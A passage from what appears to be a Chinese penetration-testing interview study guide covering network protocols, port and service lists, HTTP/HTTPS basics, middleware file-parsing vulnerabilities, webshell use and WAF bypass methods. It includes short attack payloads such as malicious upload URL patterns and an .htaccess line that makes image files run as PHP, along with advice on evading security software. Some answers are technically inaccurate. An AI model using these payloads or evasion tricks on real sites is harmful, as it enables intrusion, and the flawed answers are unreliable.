- DHCP（Dynamic Host Configuration Protocol，动态主机配置协议）：用于动态分配 IP 地址和其他网络配置参数的协议
- SNMP（Simple Network Management Protocol，简单网络管理协议）：用于网络设备的管理和监控
# 需注意，TCP 和 UDP 仅负责提供传输层的服务，应用层协议则建立在 TCP 或 UDP 之上，通过其实现应用程序间的通信
```

### 00x11 TCP 与 UDP 区别总结

```shell
# TCP（Transmission Control Protocol，传输控制协议）和 UDP（User Datagram Protocol，用户数据报协议）常见传输层协议
区别如下：
1. 连接性：
	- TCP 是一种面向连接的协议，通信前先建立连接确保可靠数据传输
	- UDP 是一种无连接的协议，通信双方直接交换数据包而无需事先建立连接
2. 可靠性：
	- TCP 提供可靠数据传输，通过数据序列号、确认应答机制、超时重传等机制确保数据正确性和完整性
	- UDP 不提供可靠性保证，数据包可能会丢失、重复或乱序
3. 效率：
	- TCP 可靠性机制需增加包头开销及维护连接状态的开销，TCP 比 UDP 更消耗计算和带宽资源。
	- UDP 因不需建立连接和维护状态，比 TCP 更高效
4. 消息边界：
	- TCP 是面向流协议，将连续的数据流划分为数据块，但不保留消息边界，因此应用层需自行定义消息开始和结束
	- UDP 是数据报协议，每个 UDP 包都是一个独立的消息，保留消息边界
5. 适用场景：
	- TCP 适用于要求可靠传输、顺序性和流量控制的应用，如网页浏览、文件传输、电子邮件等
	- UDP 适用于实时性要求较高、数据丢失可容忍的应用，如音频、视频流传输、在线游戏等
# 需注意，TCP 提供可靠数据传输，但不能保证最终应用层的数据完整性。特定情况下 UDP 可通过应用层实现可靠性机制提供可靠数据传输。选择使用 TCP 或 UDP 取决于具体应用需求和性能要求
```

### 00x12 TCP 粘包/拆包原因及解决方案

```shell
# TCP 粘包和拆包是在 TCP 传输过程中可能出现的问题。数据发送方在发送数据时 TCP 协议会将数据分成合适大小的包进行发送。而接收方处理数据时因 TCP 是流式协议，无法保证接收到数据包的大小和数量与发送方发送的一致。导致以下问题：
1. TCP 粘包：当多个小的数据包被发送方组合成一个大的数据包时，接收方可能在一次读取操作中接收到多个数据包，即粘包现象
2. TCP 拆包：当一个大的数据包被发送方拆分成多个小的数据包时，接收方可能在一次读取操作中接收到不完整的数据包，即拆包现象
# TCP 粘包和拆包发生原因是传输层的数据以字节流的形式进行传输，无明确的消息边界。使得接收方难以区分发送方发送的数据包的边界位置

# 可采用以下解决方案：
1. 消息边界标记：在数据包中添加特定标记，用于标识数据包边界。接收方根据这个标记正确拆分接收到的数据包
2. 固定长度消息：发送方将每个数据包固定为相同长度，接收方按照固定长度读取数据包，从而避免粘包和拆包问题
3. 消息长度前置：在每个数据包的开头添加表示消息长度的字段，接收方首先读取长度字段，然后根据长度读取相应字节数的数据，以确保每个消息完整接收
4. 使用应用层协议：在应用层使用特定协议进行消息的分割和重组，如 HTTP、WebSocket 等
# 解决方案可根据具体情况选择，并结合应用层需求处理 TCP 粘包和拆包问题
```

### 00x13 SYN 攻击原理

```shell
# SYN 攻击（SYN flood attack）一种网络攻击，攻击者向目标主机发送大量的 SYN 请求，导致目标主机的资源耗尽，无法正常工作
# SYN 攻击的原理如下：
1. 攻击者向目标主机发送大量的 SYN 请求
2. 目标主机收到 SYN 请求后，会向攻击者发送 SYN-ACK 确认报文
3. 攻击者收到 SYN-ACK 确认报文后，不会发送 ACK 确认报文
4. 目标主机等待 ACK 确认报文超时，会重发 SYN-ACK 确认报文
5. 攻击者继续不发送 ACK 确认报文
6. 目标主机重复发送 SYN-ACK 确认报文，直到资源耗尽

# SYN 攻击的危害如下：
1. 导致目标主机的资源耗尽，无法正常工作
2. 影响目标主机的正常通信
3. 导致目标主机的服务不可用

# SYN 攻击的防范措施如下：
1. 使用防火墙过滤 SYN 请求
2. 使用 SYN Cookies 防范 SYN 攻击
3. 使用 TCP 连接缓冲区管理技术防范 SYN 攻击
4. 使用 SYN 洪水检测技术防范 SYN 攻击
5. 使用 SYN 重放检测技术防范 SYN 攻击
```

### 00x14 SYN Flood 攻击原理

```shell
# SYN Flood 是一种网络攻击，攻击者向目标主机发送大量的 SYN 请求，导致目标主机的资源耗尽，无法正常工作
# SYN Flood 攻击的原理如下：
1. 攻击者向目标主机发送大量的 SYN 请求
2. 目标主机收到 SYN 请求后，会为每个 SYN 请求创建一个新的 TCP 连接
3. 当目标主机的 TCP 连接数达到最大值时，会停止创建新的 TCP 连接
4. 攻击者继续向目标主机发送 SYN 请求，导致目标主机的 TCP 连接数超过最大值
5. 目标主机无法创建新的 TCP 连接，无法处理正常的网络流量

# SYN Flood 攻击的防御方法如下：
1. 使用防火墙过滤 SYN 请求
2. 使用 TCP 连接缓冲区来缓冲 SYN 请求
3. 使用 SYN Cookies 来防止 SYN 请求的重放
```

## 0x00x028 端口

```shell
# web 网站
	80 web http
	80-89 web
	8000-9090 web
	8080 web tomcat
# 数据库
	1433 MSSQL
	1443 SQL
	1521 Oracle
	3306 MySQL
	5432 PostgreSQL
	50000 DB2
# 特殊服务类
	139,445 Samba
	389,639 LDAP
	443 SSL 心脏滴血 https
	445 ms08067/ms11058/ms17010等
	873 Rsync未授权
	1099 RMI
	5984 CouchDB http://xxx:5984/_utils/
	6379 Redis 未授权访问，无需认证即可访问内部数据/getshell
	7001,7002 WebLogic 默认弱口令、反序列
	8080,8443 Jenkins
	9200,9300 Elasticsearch 参考 WooYun: 多玩某服务器 ElasticSearch 命令执行漏洞
	11211 Memcache 未授权访问
	27017,27018 MongoDB 未授权访问
	50000 SAP 命令执行
	50070,50030 hadoop 默认端口未授权访问
# 常用端口类
	21 FTP
	22 SSH
	23 Telnet
	445 SMB 弱口令扫描
	2601,2604 zebra 路由，默认密码zebra
	3389 RDP
```

## 应用、协议、端口 附加

### 00x00 

```shell
# 请求方式
	- GET、POST、HEAD、PUT、DELETE、OPTIONS、TRACE、CONNECT
# 域名解析记录工具
	- nslookup、ping
```



### 00x00 常见状态码

```shell
# 常见的状态码有以下几种：
	1- 1XX：信息性状态码，表示请求已接收，继续处理
	2- 2XX：成功状态码，表示请求已成功被接收、理解和处理
	3- 3XX：重定向状态码，要完成请求必须进一步操作
	4- 4XX：客户端错误状态码，请求包含语法错误或者无法完成请求
	5- 5XX：服务器错误状态码，服务器在处理请求的过程中发生了错误
具体而言，常见的状态码包括：
	200 OK：请求已成功，服务器成功处理客户端请求，且响应包含所期望的内容
	201：请求成功并已创建新的资源
	202：已接受请求，但未处理完毕
	300：请求的资源可在多处得到
	301 Moved Permanently：请求的资源已被永久移动到新的 URL，返回新的 location 头，客户端应使用新的 URL 进行请求
	302：临时移动，请求的资源临时被移动到新的 URL，返回新的 location 头
	303：重定向，请求的资源已找到，需使用 GET 方法重新获取
	304：内容未修改，使用缓存
	400 Bad Request：错误请求，请求无效，服务器无法理解客户端发送请求的格式
	401：未授权，请求要求进行身份验证
	403 Forbidden：禁止，服务器拒绝访问请求的资源，即客户端没有访问权限
	404 Not Found：未找到，请求的资源不存在，服务器找不到请求的资源
	500 Internal Server Error：服务器内部错误，服务器在处理请求时遇到预料不到的情况或错误，无法完成请求，是通用的服务器错误响应
	501：未实现，服务器不支持当前请求所需要的某个功能
	502 Bad Gateway：错误网关，服务器作为网关或代理服务器时，从上游服务器接收到无效的响应
	503 Service Unavailable：服务不可用，服务器暂时无法处理请求，通常是因服务器维护或负载过重不能响应
	504 Gateway Timeout：网关超时，服务器作为网关或代理服务器时，未能及时从上游服务器获取响应
```

### 00x01 一次完整 HTTP 请求过程

```shell
1- 解析 URL：客户端解析用户输入的 URL，提取出协议、主机名、端口号、路径等信息
2- 域名解析：将域名解析成可用 IP 地址和端口号。包括浏览器先查询自身 DNS 缓存，未找到会查找系统自身 DNS 缓存、hosts 文件查找，最后发起远程 DNS 解析请求
3- 建立 TCP 连接：客户端根据解析得到主机名和端口号，浏览器随机端口（1024 < 端口 < 65535）向与服务器建立 TCP 连接。默认使用 HTTP TCP 作为传输层协议
4- 发起请求：客户端向服务器发送 HTTP 请求报文，包括请求方法（GET/POST 等）、请求头（客户端和所需资源信息等）和请求体（对需发送数据的请求，如 POST）
5- 服务器处理 HTTP 请求：服务器接收到 HTTP 请求报文后，根据请求的 URL 和方法进行相应的处理，可能涉及数据查询、业务逻辑处理等。
6- 服务器返回响应：服务器生成 HTTP 响应报文，包括响应状态码（请求成功/失败的代码）、响应头（服务器信息/响应内容类型等）和响应体（实际响应数据）
7- 响应传输：服务器将响应报文通过建立的 TCP 连接发给客户端
8- 客户端接收响应：客户端接收到服务器发送的 HTTP 响应报文
9- 客户端处理响应，解析 HTML：客户端收到响应后，根据响应报文中的状态码和响应头进行处理。客户端会解析响应体的数据，并加载其中的静态资源，如js、css、图片等
10- 客户端渲染展示内容：当所需资源都加载完成后，客户端就会开始渲染页面，并将内容展示给用户
11- 关闭 TCP 连接：根据 HTTP 版本和服务器设置，TCP 连接可能会通过持久连接（Keep-Alive）保持活动状态以便后续请求复用，或在请求/响应后关闭

# HTTP/1.1 中引入持久连接（HTTP keep-alive），可以让TCP连接保持活跃状态，方便后续的请求
# 以上过程描述一次简化 HTTP 请求过程。实际可能涉及一些其他细节和步骤，如重定向、缓存处理等
```

### 00x02 HTTP 长连接和短连接的区别

```shell
# 在 HTTP 协议中，长连接（Keep-Alive）和短连接是两种不同的连接方式，区别在于连接持续时间和是否需要频繁建立/断开连接
	1- 短连接：在短连接方式下，每次客户端和服务器之间请求/响应完成后，连接会立即关闭。即每个请求都需建立一个新连接，服务器发送响应后立即关闭连接，不保持连接状态。这种方式对服务器资源消耗较小，但在频繁请求的情况下，建立和关闭连接的开销会增加
	2- 长连接：在长连接方式下，客户端和服务器之间的连接会被保持活跃，不会立即关闭。客户端/服务器可在同一连接上发送多个请求/响应。连接持续时间可由服务器或客户端控制，允许更多请求和响应通过同一连接完成。这种方式可减少频繁连接的开销，提高通信效率，但同时也会占用服务器资源较长时间
	3- 短连接适合小规模请求和响应，对服务器资源要求较低。长连接适合大规模、频繁的请求和响应，提高通信效率，但需考虑服务器资源的管理和控制。
	4- 无论长短连接客户端消耗的资源一样，Web 应用中，多数情况下都采用长连接方式提高性能和用户体验
	5- 由于 HTTP 协议的请求-响应模型特性，长连接并不能减少报文的传输量，只是减少 TCP 建立和关闭消耗。在频繁请求同一资源情况下，使用短连接更能减少资源消耗
```

### 00x03 什么是 SSL

```shell
# SSL（Secure Sockets Layer），安全套接层，一种用于保护网络通信安全的加密协议，SSL 最初由 Netscape 公司开发，后由其演进为 TLS（Transport Layer Security）协议，用于两个应用程序间提供加密和身份验证，确保数据在传输过程中的机密性和完整性，为网站和应用程序提供加密和身份验证等方面的保障。
	1- 加密：SSL 使用对称和非对称加密的组合来加密传输数据。对称加密使用相同密钥对数据进行加解密，非对称加密（公钥加密）使用一对密钥，公钥加密数据，私钥解密数据。SSL 使用这两种加密方式相结合的方式保证数据的机密性
	2- 身份验证：SSL 使用数字证书来验证通信双方身份。证书由受信任的证书颁发机构（CA）颁发，包含服务器的公钥和其他相关信息。客户端在连接服务器时，会验证服务器的证书，确保通信的对方是合法的、可信的服务器
	3- 完整性保护：SSL 使用消息摘要算法（如SHA）来对传输的数据进行哈希计算，生成消息摘要。接收方可使用相同算法对接收到的数据进行计算，比较生成的摘要值，以验证数据在传输过程中是否被篡改
# 通过这些安全机制，SSL 可保护网络通信中的敏感数据，如用户名、密码、信用卡号等，免受窃听、篡改和伪装等攻击。SSL 广泛应用于诸如网上银行、电子商务、电子邮件、文件传输等需要保护数据安全的通信场景
```

### 00x04 HTTPS 握手过程中用到哪些技术

```shell
1- 密钥交换 非对称加密（加密公钥）
2- 对称加密（加密数据）
3- 预共享密钥（PSK）
4- 身份验证（数字证书）
5- 握手协议（SSL/TLS）
6- 加密套接字层（SSL）版本协商
```

### 00x05 HTTPS 如何保证数据传输安全性

```shell
# HTTPS 是如何保证数据传输的安全（SSL/TLS 是怎么工作保证安全的）
1- 握手过程：在建立 HTTPS 连接前，客户端和服务器之间进行 SSL/TLS握手过程。步骤如下：
   1.1- 客户端发起握手请求：客户端向服务器发送一个握手请求，请求建立安全连接
   1.2- 服务器响应握手请求：服务器接收到客户端的握手请求后，向客户端发送包含证书的响应。证书包含服务器的公钥、服务器的身份信息及由证书颁发机构（CA）签名
   1.3- 客户端验证证书：客户端收到服务器的证书后，会验证证书的有效性。包括检查证书的有效期、验证证书签名是否可信及验证服务器的身份信息
   1.4- 客户端生成密钥：证书验证通过，客户端会生成随机对称密钥（称为会话密钥或对称密钥），用于后续数据加解密
   1.5- 密钥交换：客户端用服务器的公钥加密生成的对称密钥，并发送给服务器
   1.6- 会话密钥建立：服务器用自己的私钥对收到的加密的会话密钥进行解密，以获取对称密钥。客户端和服务器都持有相同的会话密钥，用于加解密传输的数据
2- 数据传输加密：建立安全连接后，客户端和服务器间的数据传输使用对称密钥加密。客户端使用对称密钥加密要发送的数据，服务器使用对称密钥解密接收到的数据
3- 数据完整性验证：除加密外，SSL/TLS 还使用哈希算法验证数据完整性。在传输过程中，数据进行哈希处理并附加消息摘要（MAC），接收方在接收到数据后重新计算哈希值，并与发送方传递的摘要比对。摘要不匹配表示数据被篡改，连接可能被中断
```

### 00x06 HTTP 和 HTTPS 区别

```shell
# HTTP（Hypertext Transfer Protocol）和 HTTPS（Hypertext Transfer Protocol Secure）用于在客户端和服务器间传输数据的协议，主要区别在于安全性
	1- 安全性：
		- HTTP 是一种明文、不安全的协议，数据在传输过程中以明文形式发送、未加密，容易被非法窃听、获取和篡改。
		- HTTPS 是 HTTP 加上 SSL（Secure Sockets Layer）或 TLS（Transport Layer Security）组合形成的加密协议，对传输的数据进行加密和验证，确保数据机密性和完整性，提高数据数据传输安全性
	2- 端口号：
		- 不同的连接方式，HTTP 使用 80 端口，HTTPS 使用 443 端口
		- 建立 HTTPS 连接时，需进行 SSL/TLS 握手过程，涉及加、解密操作，需使用不同默认端口
	3- 证书/费用：
		- HTTP 无需证书验证身份，易受伪装和中间人攻击
		- 为建立 HTTPS 连接，服务器需使用数字证书验证其身份。证书由受信任的第三方机构（证书颁发机构 CA）颁发，用于验证服务器真实性
		- HTTPS 需要购买 SSL 证书，一般需要一定费用，HTTP 则无
	4- 加密：
		- HTTP 不提供加密功能，数据以明文形式传输
		- HTTPS 使用公开密钥加密（Public Key Encryption）加密传输数据，传输过程中数据被加密并在接收方解密，确保数据传输过程中的保密性
	5- 响应速度：
		- 理论上，HTTP 响应速度更快，HTTP 只需三次握手， 3 个包即可建立连接，而 HTTPS 除了三次握手，还需进行 SSL 握手，一共需 12 个包
	6- 消耗资源：
		- HTTPS 是构建在 SSL 之上的 HTTP 协议，HTTPS 会消耗更多服务器资源
	7- 展示方式：
		- 当浏览器访问 HTTPS 网站时，地址栏会显示小锁的图标，表示连接是安全的。而 HTTP 则无
```

### 00x07 URI 和 URL 的区别

```shell
# URI（Uniform Resource Identifier）和 URL（Uniform Resource Locator）是用于标识和定位资源的标识符，实际使用中这两个术语常互换使用
1- URI（统一资源标识符）是一个更通用的概念，用于唯一标识资源，可为网络上任何类型的资源，不限于网页。包括两个子集：URL 和 URN（Uniform Resource Name）
2- URL（统一资源定位符）是 URI 的一个特定类型，用于定位资源的具体位置。URL 提供一种访问和获取资源的方式。包含协议（如 HTTP、FTP）、主机名（如 www.example.com）和路径（如 /images/pic.jpg），可直接指向资源所在网络位置
3- URN（统一资源名称）是 URI 的另一个子集，用于唯一命名资源而无需指定其位置。URN 不提供访问资源的方法，只提供唯一名称。如 urn:isbn:9783161484100 可用于唯一标识一本图书，但不表示该图书具体位置
# 总结起来，URI 是通用标识符概念，用于唯一标识资源。URL 是 URI 的一种具体类型，用于定位资源并提供访问方式。而 URN 用于提供资源的唯一名称而无需指定位置
```

### 00x08 正向/反向代理的区别

```shell
# 正向代理（Forward Proxy）：
	1- 作用方向：客户端与服务器间的中介，客户端通过正向代理与互联网上的服务器进行通信
	2- 隐藏真实客户端：正向代理隐藏真实客户端身份信息，将客户端请求转发给服务器，并将响应返回给客户端。服务器不知道请求实际来自哪个客户端
	3- 突破访问限制：客户端可通过正向代理访问被限制或不可访问的资源，客户端请求是通过代理发送的，而不是直接发送的
	4- 代理服务器需手动配置：为使用正向代理，客户端需手动配置代理服务器 IP 地址和端口
# 反向代理（Reverse Proxy）：
	1- 作用方向：用于服务器和客户端间的中介，充当服务器的代理，客户端通过反向代理与真实服务器通信
	2- 负载均衡：可将客户端请求分发给多个服务器实现负载均衡，客户端不需知道实际服务器地址，只需与反向代理通信
	3- 安全性和缓存：可提供额外的安全层过滤恶意请求和攻击，还可缓存静态内容提高性能
	4- 透明性：对于客户端而言，并不知道正与反向代理通信而不是与实际的服务器直接通信
# 总结：
	正向代理隐藏真实客户端身份，并帮助客户端访问受限资源，而反向代理则作为服务器代理，为客户端提供负载均衡、安全性和性能优化的功能。
	正向代理是客户端的中介，反向代理是服务器的中介，使用哪种代理模式取决于具体的需求
```

### 00x09 证书透明度的危害

```shell
在于攻击者可利用此类日志证书中的各种详细信息，追踪公司并详细列出有效的用户名或电子邮件地址，甚至攻击安全控制措施较少的应用系统，以便接管系统和横向移动
```

### 00x10 同源策略

```
同协议、端口、域名，可共享Cookie，提高用户体验性
```

### 00x11 如何劫持桌面管理员会话

```shell
- 提权到system 权限，然后工具劫持任何处于已登录用户的会话，无需获得该用户登录凭证；
- 中高端服务会话可以是连接状态或未连接状态；
```

## 0x00x029 常见中间件及解析漏洞

```shell
# 中间件
	1- IIS 6.x
	2- IIS 7.5
	3- Apache
	4- Nginx
	5- Tomcat
	6- Weblogic
	7- Jboos
# 1- IIS 6.X，asp 目录默认解析asp 文件
多数为Windows Server 2003，网站较老，要支持 aspx 需安装.NET框架
	1.1- 利用 2003 系统特性，凡文件名后出现 \/.:;* 都被舍弃
			如：www.xxx.com/xx.asp；.jpg
	1.2- 凡文件名以 apx 结尾，里面的任何文件都被当作脚本语言解析
	1.3- 除 asp、aspx 外，cer、cdx、asa 等后缀都可被当作 asp 或 aspx 脚本语言解析
		如：mamu.cer muma.cdx mamu.asa
# 4-IIS 7.5，.jpg/.php 形式的解析
	# Nginx 和 IIS7.5 都因开启 CGI.FIX_PATHINFO 参数，默认以 CGI 方式支持 PHP 解析
	1- 在任意后缀后面加上x.php
		如：www.xxx.com/logo.jpg/x.php
			 www.xxx.com/logo.txt/x.php
			 www.xxx.com/logo.doc/x.php
# 2- Apache，从右向左解析规则漏洞
	1- muma.php.xxx.aaa 从左往右解析执行
# 3- Nginx，.jpg/1.php；00% 截断
	1- www.xxxx.com/1.jpg/1.php
	2- www.xxxx.com/1.jpg%00.php
	3- www.xxxx.com/1.jpg/%20\0.php

```

## 中间件漏洞 附加

[Web中间件常见漏洞总结](https://blog.csdn.net/bylfsj/article/details/102683791)

[redis漏洞的三种利用方式](https://www.cnblogs.com/hk-ss/p/14943691.html)

## 0x00x030 编辑器漏洞

```shell
# 其实还是文件上传漏洞
	1- 	FCKeditor 编辑器
	2-	EWEbeditor 编辑器
	3-	DotNetTextBox 编辑器
	4-	Kedit 编辑器
	5-	Cute Editor 在线编辑器
# 这个问题基本回答个两三个就可以
```

## 0x00x031  Access 本地利用

```shell
# access 扫出后缀为 asp 的数据库文件，访问乱码，如何实现到本地利用
	1- 迅雷下载，直接改后缀为.mdb。
```

## 0x00x032 IIS 服务器应如何做保护措施

```shell
# IIS 服务器应该做哪些方面的保护措施
	1- 保持 Windows 升级
	2- 使用 IIS 防范工具
	3- 移除缺省 Web 站点
	4- 卸载不需要的服务，如 FTP 和 SMTP 
	5- 有规则检查管理员组和服务
	6- 严格控制服务器的写访问权限
	7- 设置复杂密码
	8- 减少/排除 Web 服务器上的共享
	9- 禁用 TCP/IP 协议中的 NetBIOS
	10- 使用 TCP 端口阻塞
	11- 仔细检查*.bat 和*.exe 文件: 每周搜索一次*.bat
	12- 管理 IIS 目录安全
	13- 使用 NTFS 安全
	14- 管理用户账户
	15- 审计 Web 服务器
```

## WEB 渗透疑问 附加

### 00x00 什么是 Webshell，如何拿网站 Webshell

```shell
1- Webshell 是一种恶意脚本，通常用于攻击者在网站上植入后门，以便控制被攻击的网站。Webshell 可允许攻击者上传、下载和执行文件，修改网站配置，甚至控制服务器
2- 要获取网站 Webshell，攻击者通常需利用网站安全漏洞，如 SQL 注入、XSS 攻击或其他漏洞，攻击者可通过这些漏洞在网站上放置恶意脚本，从而获取 Webshell
```

### 00x01 CMS 渗透时扫描目录的意义

```shell
# 一个成熟且相对安全的  CMS，渗透时扫描目录的意义？
	1- 发现隐藏的敏感文件和二级目录
	2- 收集有关 CMS 版本和插件的信息
	3- 识别默认/弱密码(站长误操作，错误配置)
	4- 利用已知程序漏洞，检测路径遍历和敏感文件泄露
```

### 00x02 上传大马后访问乱码

```shell
# 上传大马后访问乱码解决办法
	1- 浏览器中改编码
```

### 00x03 渗透时看到编辑器应干什么

```shell
# 在某后台新闻编辑界面看到编辑器，应先做什么
	1- 查看编辑器的名称版本，搜索公开的漏洞
```

### 00x04  为何 MySQL 数据库站点只 80 端口开放

```
1- 端口更改
2- 站库分离
3- 3306 端口不对外开放
```

### 00x05 3389 无法连接的几种情况

```shell
1- 未开放 3389 端口
2- 端口被修改
3- 防护拦截
4- 处于内网(需进行端口转发)
```

### 00x06 GET 和 POST 区别

```shell
1- GET 请求可被缓存，POST 请求不会被缓存
2- GET 请求保留在浏览器历史记录中，POST 请求不会保留在浏览器历史记录中
3- GET 请求可被收藏为书签，POST 请求不能被收藏为书签
4- GET 请求对数据长度有限制，POST 请求没有限制
5- GET 请求只应当用于取回数据，POST 请求应当用于修改数据

6- 安全性：POST 比 GET 更安全，因为参数不会被保存在浏览器历史或 web 服务器日志中
7- 数据类型：GET 只允许 ASCII 字符，而 POST 支持整个 ISO10646 字符集
8- 数据长度：GET 传输数据量小，主要受 URL 长度限制；而 POST 可传输大量数据
9- 可见性：GET 在 URL 中对所有人都可见，而 POST 不会显示在 URL 中

# 本质尚 GET 和 POST 无区别，均为 HTTP 协议
```

### 00x07  Webshell 拿到站点如何利用 .htaccess 文件

```shell
# 拿到一个 webshell 发现网站根目录下有.htaccess 文件，能做什么
# .htaccess 文件是 Apache 服务器的配置文件，允许管理员在网站根目录下设置各种网站配置和安全性选项。可尝试以下操作：
	1- 查看文件内容：打开 .htaccess 文件查看其中的内容，可揭示有关网站配置和安全性的信息
	2- 检查安全性设置：.htaccess 文件可用于配置安全性选项，如访问控制、文件权限等，可确定是否存在任何限制或漏洞
	3- 修改网站配置：.htaccess 文件可用于修改网站的配置，如重定向、错误页面等，可尝试修改某些设置以查看是否对网站的行为产生影响
# 可插入解析信息：
<FilesMatch "xxx.jpg"> SetHandler application/x-httpd-php </FilesMatch>
制造 apache 解析漏洞 ,.jpg 文件会被解析成 .php 文件
```

### 00x08 为何 ASPX 木马权限比 ASP 大

```shell
# ASPX 木马和 ASP 木马都是基于 .NET 技术开发
ASP 木马只能访问系统的文件和目录，而 ASPX 木马可利用 .NET 框架特性访问数据库等更多系统资源，ASPX 木马具有更大权限，且可更容易利用系统权限进行攻击
ASPX 木马可利用 .NET 框架特性实现更多的功能，如利用反射加载程序集、调用非公开函数等，从而获得更大的权限
```

### 00x09 Webshell 有 System 权限无法执行命令原因

```shell
1- 命令执行被限制：有些服务器环境可能会限制或禁止执行某些命令，特别是危险系统命令。可尝试执行其他命令或使用不同命令语法，看看是否有执行权限。如尝试使用反斜杠 `\` 或尝试在命令前加上绝对路径。另可尝试使用其他命令执行函数，如 `eval()` 或者 `system()`
2- 安全软件或防火墙阻止命令执行：服务器可能安装安全软件或防火墙，可能会检测到 Webshell 并阻止执行命令。可尝试使用不同 Webshell 或通过修改 Webshell 代码，绕过检测。可尝试使用反向 Shell 连接伪装常见网络流量以躲避监测
3- 凭证不足：Webshell 具有系统权限也可能存在某些操作需更高特权级别才能执行。可尝试提升权限，寻找更高权限的用户或漏洞，如尝试以 root 用户身份执行命令
4- 服务器配置问题：有时服务器配置可能会限制命令执行。可检查服务器配置文件，如 Apache 的 .htaccess 文件或 Nginx 配置文件，看是否有相关限制配置。有可尝试修改以允许命令执行
```

### 00x10 安全狗是否会追踪变量发现一句话木马

```shell
# 安全狗会追踪变量，从而发现出是一句话木马吗？ 根据特征码
安全狗是一种安全防护软件，主要防范针对网站的 CC 攻击和 SQL 注入攻击。通过分析网站变量的变化判断是否遭受攻击，从而采取相应的防护措施。若一句话木马涉及到变量的修改或替换，安全狗可能会通过追踪变量来发现
# 若一句话木马未修改或替换任何变量，或采取其他手段避免被安全狗检测到，安全狗就可能无法发现。安全狗的检测能力取决于具体情况和一句话木马的设计
```

### 00x11 Wireshark 过滤规则

```shell
# Wireshark 一款用于网络协议分析的工具，提供强大的过滤功能，可帮助用户在网络流量中筛选出感兴趣的数据包。以下是常用 Wireshark 过滤规则示例：
1. 根据IP地址过滤：
	- ip.addr == 192.168.0.1：只显示源或目标IP地址为192.168.0.1的数据包
	- ip.src == 192.168.0.1：只显示源IP地址为192.168.0.1的数据包
	- ip.dst == 192.168.0.1：只显示目标IP地址为192.168.0.1的数据包
2. 根据协议过滤：
	- tcp：只显示TCP协议的数据包
	- udp：只显示UDP协议的数据包
	- http：只显示HTTP协议的数据包
	- icmp：过滤协议为ICMP的数据包
3. 根据端口号过滤：
	- tcp.port == 80：只显示目标或源端口号为80的TCP数据包
	- udp.port == 53：只显示目标或源端口号为53的UDP数据包
4. 逻辑运算符：
	- and：逻辑与运算符，用于同时满足多个过滤条件，例如：ip.src == 192.168.0.1 and tcp.port == 80
	- or：逻辑或运算符，用于满足任一过滤条件，例如：tcp.port == 80 or tcp.port == 443
5. 根据协议字段过滤：
	- http.host == "www.example.com"：只显示目标或源HTTP请求或响应中的主机字段为"www.example.com"的数据包
	- http.request.method == "GET"：只显示HTTP GET请求的数据包
6. 根据数据包长度过滤：
	- frame.len > 100：只显示数据包长度大于100字节的数据包
7. 其他
	- limit 50：仅显示前50个数据包
	- negate：取反当前过滤条件，即显示不符合当前过滤条件的数据包
# 以上只是常见的 Wireshark 过滤规则示例，可根据具体需要和分析要求，使用不同过滤条件筛选所需的数据包。在 Wireshark 的界面中，可使用过滤栏或在过滤器表达式框中直接输入过滤规则应用过滤
```

### 00x12 如何伪造钓鱼邮箱

```shell
# 如何伪造钓鱼邮箱？会面临什么问题？
```

### 00x13 拿到 webshell 不出网该如何

```shell
# 漏洞不出网该如何
	漏洞回显
- reg 上传正向连接；
- 探测出网协议，如 DNS，ICMP；
  - DNS 出网协议如何利用：将域名解析指向自己的 VPS，然后设置 NS 记录等；
```

### 00x14 渗透如何测登录框

```shell
1- 弱密码与暴力破解
2- 万能密码、SQL / XSS 注入
3- 逻辑漏洞
	3.1- 用户名枚举
	3.2- 任意密码重置
	3.3- 任意用户注册
	3.4- 短信轰炸
	3.5- 任意用户覆盖
	3.6- 验证流程绕过

```

### 00x15 OOB 攻击原理

```shell
# 利用 NetBIOS 中 OOB（Out of Band）的漏洞进行的
利用原理
	- 通过 TCP/IP 协议传递一个数据包到计算机某个开放的端口上（一般是 137、138 和 139），当计算机收到这个数据包后就会瞬间死机或蓝屏现象，不重新启动计算机就无法继续使用 TCP/IP 协议访问网络
```



## 0x00x033 数据库类型

```shell
# 数据库可以分为关系型数据库和非关系型数据库两大类。
1- 关系型数据库（RDBMS）：
	1.1- MySQL: 开源的关系型数据库管理系统，被广泛应用于各种应用程序中
	1.2- Oracle: 功能丰富的商业关系型数据库管理系统，适用于大型企业级应用程序
	1.3- Microsoft SQL Server: 由 Microsoft 开发的关系型数据库管理系统，与 Windows 操作系统集成紧密
	1.4- PostgreSQL: 开源的关系型数据库管理系统，具有高度的扩展性和可靠性
	1.5- Microsoft Access
2- 非关系型数据库（NoSQL）：
	2.1- MongoDB: 开源的文档型数据库，存储数据以灵活的文档格式（如 JSON）
	2.2- Redis: 开源的内存数据库，用于高速数据缓存和键值存储
	2.3- Cassandra: 分布式、高可扩展性的列式数据库系统，设计用于处理大量数据
	2.4- Neo4j: 图形数据库，用于存储和处理具有图形结构的数据，适用于图形数据分析和推荐系统
	2.5- HBase
	2.6- BigTable
除上述常见数据库类型，还有些特定用途的数据库：
1- 搜索引擎数据库：如 Elasticsearch，专用于全文搜索和实时分析
2- 时间序列数据库：如 InfluxDB，专用于存储和分析时间序列数据，如传感器数据、日志数据等
3- 对象存储数据库：如 Amazon S3、Google Cloud Storage，专用于存储和管理大规模的非结构化数据
# 数据库类型在适用场景、数据结构、数据模型和性能特点上有所区别，选择合适的数据库取决于应用程序的需求和数据处理的规模
```

## Bypass 附加

### 00x00 如何绕过 WAF

```shell
# 有几种方法可绕过 WAF（Web 应用防火墙）：
	1- 大小写绕过：有些 WAF 会对某些关键字进行大小写检测，如 "union"、"select" 等，可把这些关键字写成 "UniOn"、"sElEcT" 等进行绕过
	2- 简单编码绕过：有些 WAF 只对普通字符进行 URL 解码，不能对 "%00"、"%20" 等编码进行解码，可使用这些编码来绕过 WAF 检测
	3- 注释绕过：有些 WAF 只对一次 SQL 查询语句进行检测，不会对多次查询进行检测，可在 SQL 查询语句中添加注释绕过 WAF 检测
	4- 分隔符重写绕过：有些 WAF 对 SQL 语句中的关键字进行检测，可使用 "||" 等分隔符重写 SQL 语句，从而绕过 WAF 检测
	5- 使用生僻函数：有些 WAF 对常见函数进行检测，可使用生僻函数绕过 WAF 检测
	6- 寻找网站源 IP：有些 WAF 基于 IP 地址进行过滤，可尝试找到网站源 IP，直接访问源 IP，从而绕过 WAF 检测
# 需注意，这些方法可能会因 WAF 的不同而有所不同，而且绕过 WAF 是非法的行为，应该仅在合法授权的情况下使用
```

### 00x01 如何绕过宝塔禁止的 PHP 函数

```shell
Bypass disable_function
